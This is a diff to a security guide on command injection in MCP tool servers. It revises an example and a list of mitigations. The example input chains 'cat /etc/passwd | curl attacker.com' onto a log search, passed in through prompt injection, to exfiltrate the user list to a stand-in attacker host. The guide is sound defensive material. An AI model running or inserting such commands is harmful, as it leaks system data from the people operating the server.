@@ -8,9 +8,9 @@
 
     An MCP server provides a tool for searching log files. A user asks: “Search the logs for errors from yesterday.”
 
-    The MCP sever constructs a command like: ```grep ‘errors’ /var/log/app.log```. But what if the user (or attacker using prompt injection) asks:
+    The MCP server constructs a command like: ```grep 'errors' /var/log/app.log```. But what if the user (or attacker using prompt injection) asks:
 
-    “Search logs for errors; ```cat /etc/password \| curl attacker.com```”?
+    “Search logs for errors; ```cat /etc/passwd | curl attacker.com```”?
 
     If the server concatenates this input directly into a shell command, the attacker just exfiltrated your system’s user list.
 
@@ -40,17 +40,17 @@ Azure AI Content Safety can be used as an additional signal to detect suspicious
 
 **Key Takeaways**:
 
-- Route all requests through Azure AI Content Safety before processing
-- Reject requests with detected injection patterns and never forward them
-- Use parametrized commands in code
-- Deploy distroless containers without shell utilities
-- Apply AppArmor profiles restricting exec/spawn capabilities
+- Never construct shell commands from untrusted input; use parameterized execution APIs instead
+- Reject or safely degrade suspicious requests rather than forwarding them to execution paths
+- Deploy minimal containers without shell utilities where possible
+- Apply AppArmor, seccomp, or equivalent controls to restrict process execution
+- Treat content inspection as an additional signal, not the primary control
 
 ---
 
 ## Next Steps
 
-- **Related risks**: [MCP06: Prompt Injection](mcp06-prompt-injection.md) | [MCP03: Tool Poisoning](mcp03-tool-poisoning.md)
+- **Related risks**: [MCP06: Intent Flow Subversion](mcp06-prompt-injection.md) | [MCP03: Tool Poisoning](mcp03-tool-poisoning.md)
 - **Monitoring**: [MCP08: Lack of Audit & Telemetry](mcp08-telemetry.md) to detect injection attempts
 - **Strategic guidance**: [Enterprise Patterns & Lessons Learned](../adoption/enterprise-patterns.md) for security testing practices
 - **Back to**: [OWASP MCP Top 10](../index.md#owasp-mcp-top-10)
